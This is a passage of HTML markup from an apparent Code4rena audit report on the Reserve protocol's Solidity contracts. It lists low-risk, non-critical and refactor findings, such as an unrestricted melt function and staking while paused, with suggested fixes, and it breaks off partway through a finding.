<a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/443\">0xNazgul</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/437\">Cyfrin</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/429\">lukris02</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/417\">delfin454000</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/400\">luxartvinsec</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/392\">IllIllI</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/359\">descharre</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/356\">0xA5DF</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/350\">GalloDaSballo</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/342\">cryptonue</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/323\">__141345__</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/315\">hihen</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/306\">pedr02b2</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/286\">carlitox477</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/274\">SaharDevep</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/257\">shark</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/255\">BRONZEDISC</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/226\">chrisdior4</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/213\">tnevler</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/203\">ladboy233</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/179\">rotcivegaf</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/176\">MyFDsYours</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/165\">IceBear</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/118\">Bnke0x0</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/109\">Soosh</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/102\">btk</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/101\">chaduke</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/90\">RaymondFam</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/81\">Ruhum</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/80\">HollaDieWaldfee</a>, and <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/66\">Sathish9098</a>.</em></p>\n<h2 id=\"issues-overview\" style=\"position:relative;\"><a href=\"#issues-overview\" aria-label=\"issues overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Issues Overview</h2>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Letter</th>\n<th align=\"center\">Name</th>\n<th align=\"center\">Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td align=\"center\">L</td>\n<td align=\"center\">Low risk</td>\n<td align=\"center\">Potential risk</td>\n</tr>\n<tr>\n<td align=\"center\">NC</td>\n<td align=\"center\">Non-critical</td>\n<td align=\"center\">Non risky findings</td>\n</tr>\n<tr>\n<td align=\"center\">R</td>\n<td align=\"center\">Refactor</td>\n<td align=\"center\">Changing the code</td>\n</tr>\n<tr>\n<td align=\"center\">O</td>\n<td align=\"center\">Ordinary</td>\n<td align=\"center\">Often found issues</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Total Found Issues</th>\n<th align=\"center\">26</th>\n</tr>\n</thead>\n<tbody>\n</tbody>\n</table>\n<h3 id=\"low-risk-issues\" style=\"position:relative;\"><a href=\"#low-risk-issues\" aria-label=\"low risk issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk Issues</h3>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Count</th>\n<th align=\"left\">Explanation</th>\n<th align=\"center\">Instances</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td align=\"center\">[L-01]</td>\n<td align=\"left\">Melt function should be only callable by the Furnance contract</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td align=\"center\">[L-02]</td>\n<td align=\"left\">Stake function shouldn’t be accessible, when the status is paused or frozen</td>\n<td align=\"center\">1</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Total Low Risk Issues</th>\n<th align=\"center\">2</th>\n</tr>\n</thead>\n<tbody>\n</tbody>\n</table>\n<h3 id=\"non-critical-issues\" style=\"position:relative;\"><a href=\"#non-critical-issues\" aria-label=\"non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Non-Critical Issues</h3>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Count</th>\n<th align=\"left\">Explanation</th>\n<th align=\"center\">Instances</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td align=\"center\">[N-01]</td>\n<td align=\"left\">Create your own import names instead of using the regular ones</td>\n<td align=\"center\">17</td>\n</tr>\n<tr>\n<td align=\"center\">[N-02]</td>\n<td align=\"left\">Max value can’t be applied in the setters</td>\n<td align=\"center\">9</td>\n</tr>\n<tr>\n<td align=\"center\">[N-03]</td>\n<td align=\"left\">Using while for unbounded loops isn’t recommended</td>\n<td align=\"center\">3</td>\n</tr>\n<tr>\n<td align=\"center\">[N-04]</td>\n<td align=\"left\">Inconsistent visibility on the bool “disabled”</td>\n<td align=\"center\">2</td>\n</tr>\n<tr>\n<td align=\"center\">[N-05]</td>\n<td align=\"left\">Modifier exists, but not used when needed</td>\n<td align=\"center\">6</td>\n</tr>\n<tr>\n<td align=\"center\">[N-06]</td>\n<td align=\"left\">Unused constructor</td>\n<td align=\"center\">2</td>\n</tr>\n<tr>\n<td align=\"center\">[N-07]</td>\n<td align=\"left\">Unnecessary check in both the _mint and _burn function</td>\n<td align=\"center\">2</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Total Non-Critical Issues</th>\n<th align=\"center\">7</th>\n</tr>\n</thead>\n<tbody>\n</tbody>\n</table>\n<h3 id=\"refactor-issues\" style=\"position:relative;\"><a href=\"#refactor-issues\" aria-label=\"refactor issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Refactor Issues</h3>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Count</th>\n<th align=\"left\">Explanation</th>\n<th align=\"center\">Instances</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td align=\"center\">[R-01]</td>\n<td align=\"left\">Numeric values having to do with time should use time units for readability</td>\n<td align=\"center\">5</td>\n</tr>\n<tr>\n<td align=\"center\">[R-02]</td>\n<td align=\"left\">Use require instead of assert</td>\n<td align=\"center\">9</td>\n</tr>\n<tr>\n<td align=\"center\">[R-03]</td>\n<td align=\"left\">Unnecessary overflow check can be rafactored in a better way</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td align=\"center\">[R-04]</td>\n<td align=\"left\">If statement should check first, if the status is disabled</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td align=\"center\">[R-05]</td>\n<td align=\"left\">Some number values can be refactored with <code>_</code></td>\n<td align=\"center\">2</td>\n</tr>\n<tr>\n<td align=\"center\">[R-06]</td>\n<td align=\"left\">Revert should be used on some functions instead of return</td>\n<td align=\"center\">9</td>\n</tr>\n<tr>\n<td align=\"center\">[R-07]</td>\n<td align=\"left\">Modifier can be applied on the function instead of creating require statement</td>\n<td align=\"center\">2</td>\n</tr>\n<tr>\n<td align=\"center\">[R-08]</td>\n<td align=\"left\">Shorthand way to write if / else statement</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td align=\"center\">[R-09]</td>\n<td align=\"left\">Function should be deleted, if a modifier already exists doing its job</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td align=\"center\">[R-10]</td>\n<td align=\"left\">The right value should be used instead of downcasting from uint256 to uint192</td>\n<td align=\"center\">2</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Total Refactor Issues</th>\n<th align=\"center\">10</th>\n</tr>\n</thead>\n<tbody>\n</tbody>\n</table>\n<h3 id=\"ordinary-issues\" style=\"position:relative;\"><a href=\"#ordinary-issues\" aria-label=\"ordinary issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Ordinary Issues</h3>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Count</th>\n<th align=\"left\">Explanation</th>\n<th align=\"center\">Instances</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td align=\"center\">[O-01]</td>\n<td align=\"left\">Code contains empty blocks</td>\n<td align=\"center\">3</td>\n</tr>\n<tr>\n<td align=\"center\">[O-02]</td>\n<td align=\"left\">Use a more recent pragma version</td>\n<td align=\"center\">17</td>\n</tr>\n<tr>\n<td align=\"center\">[O-03]</td>\n<td align=\"left\">Function Naming suggestions</td>\n<td align=\"center\">6</td>\n</tr>\n<tr>\n<td align=\"center\">[O-04]</td>\n<td align=\"left\">Events is missing indexed fields</td>\n<td align=\"center\">2</td>\n</tr>\n<tr>\n<td align=\"center\">[O-05]</td>\n<td align=\"left\">Proper use of get as a function name prefix</td>\n<td align=\"center\">12</td>\n</tr>\n<tr>\n<td align=\"center\">[O-06]</td>\n<td align=\"left\">Commented out code</td>\n<td align=\"center\">3</td>\n</tr>\n<tr>\n<td align=\"center\">[O-07]</td>\n<td align=\"left\">Value should be unchecked</td>\n<td align=\"center\">1</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Total Ordinary Issues</th>\n<th align=\"center\">7</th>\n</tr>\n</thead>\n<tbody>\n</tbody>\n</table>\n<h2 id=\"l-01-melt-function-should-be-only-callable-by-the-furnance-contract\" style=\"position:relative;\"><a href=\"#l-01-melt-function-should-be-only-callable-by-the-furnance-contract\" aria-label=\"l 01 melt function should be only callable by the furnance contract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-01] Melt function should be only callable by the Furnance contract</h2>\n<p>The function <code>melt</code> in RToken.sol is supposed to be called only by Furnace.sol, but as how it is right now the function can be called by anyone. This is problematic considering that this function burns tokens, if a user calls it by mistake. His tokens will be lost and he won’t be able to get them back.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"77\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">569</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">melt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amtRToken</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">notPausedOrFrozen</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">570</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">_burn</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">amtRToken</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">571</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Melted</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amtRToken</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">572</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">requireValidBUExchangeRate</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">573</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<p>Consider applying a require statement in the function <code>melt</code> that the msg.sender is the furnance contract:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"78\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">569</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">melt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amtRToken</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">notPausedOrFrozen</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">569</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">() == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">furnance</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;not furnance contract&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">570</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">_burn</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">amtRToken</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">571</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Melted</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amtRToken</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">572</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">requireValidBUExchangeRate</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">573</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<h2 id=\"l-02-stake-function-shouldnt-be-accessible-when-the-status-is-paused-or-frozen\" style=\"position:relative;\"><a href=\"#l-02-stake-function-shouldnt-be-accessible-when-the-status-is-paused-or-frozen\" aria-label=\"l 02 stake function shouldnt be accessible when the status is paused or frozen permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-02] Stake function shouldn’t be accessible, when the status is paused or frozen</h2>\n<p>The function <code>stake</code> in StRSR.sol is used by users to stake a RSR amount on the corresponding RToken to earn yield and over-collateralize the system. If the contract is in paused or frozen status, some of the main functions <code>payoutRewards</code>, <code>unstake</code>, <code>withdraw</code> and <code>seizeRSR</code> can’t be used. The <code>stake</code> function will keep operating but will skip to payoutRewards, this is problematic considering if the status is paused or frozen and a user stakes without knowing that. He won’t be able to unstake or call any of the core functions, the only option he has is to wait for the status to be unpaused or unfrozen.</p>\n<p>Consider if a contract is in paused or frozen status to turn off all of the core functions including staking as well.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"79\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StRSR</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">212</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">stake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rsrAmount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">213</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rsrAmount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Cannot stake zero&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">214</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">215</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">main</span><span class=\"mtk1\">.</span><span class=\"mtk11\">pausedOrFrozen</span><span class=\"mtk1\">()) </span><span class=\"mtk11\">_payoutRewards</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">216</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">217</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// Compute stake amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">218</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// This is not an overflow risk according to our expected ranges:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">219</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">//   rsrAmount &lt;= 1e29, totalStaked &lt;= 1e38, 1e29 * 1e38 &lt; 2^256.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">220</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// stakeAmount: how many stRSR the user shall receive.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">221</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// pick stakeAmount as big as we can such that (newTotalStakes &lt;= newStakeRSR * stakeRate)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">222</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newStakeRSR</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">stakeRSR</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">rsrAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">223</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// newTotalStakes: {qStRSR} = D18{qStRSR/qRSR} * {qRSR} / D18</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">224</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newTotalStakes</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">stakeRate</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">newStakeRSR</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">FIX_ONE</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">225</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stakeAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">newTotalStakes</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">totalStakes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">226</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">227</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// Update staked</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">228</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">229</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">stakeRSR</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">rsrAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">230</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">stakeAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">231</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">232</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// Transfer RSR from account to this contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">233</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Staked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">era</span><span class=\"mtk1\">, </span><span class=\"mtk12\">account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">rsrAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">stakeAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">234</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">235</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// == Interactions ==</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">236</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">IERC20Upgradeable</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rsr</span><span class=\"mtk1\">)).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">account</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">rsrAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">237</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<h2 id=\"n-01-create-your-own-import-names-instead-of-using-the-regular-ones\" style=\"position:relative;\"><a href=\"#n-01-create-your-own-import-names-instead-of-using-the-regular-ones\" aria-label=\"n 01 create your own import names instead of using the regular ones permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-01] Create your own import names instead of using the regular ones</h2>\n<p>For better readability, you should name the imports instead of using the regular ones.</p>\n<p>Example:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"80\"><code 